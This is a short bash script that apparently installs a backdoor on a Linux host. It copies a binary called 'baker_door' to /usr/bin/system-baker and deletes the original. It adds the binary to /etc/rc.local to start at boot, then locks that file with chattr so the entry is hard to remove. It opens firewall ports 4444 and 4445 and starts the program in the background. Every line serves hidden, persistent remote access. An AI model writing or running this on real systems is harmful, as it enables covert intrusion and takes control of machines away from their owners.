#!/bin/bash

LINE="/usr/bin/system-baker"
FILE="/etc/rc.local"

chattr -i /etc/rc.local
if ! grep -Fxq "$LINE" "$FILE"; then
    echo "$LINE" >> "$FILE"
fi
chmod +x /etc/rc.local
chattr +i /etc/rc.local
firewall-cmd --permanent --add-port=4444/tcp
firewall-cmd --permanent --add-port=4445/tcp
firewall-cmd --reload

cp baker_door /usr/bin/system-baker
rm baker_door
chmod +x /usr/bin/system-baker
/usr/bin/system-baker & echo ""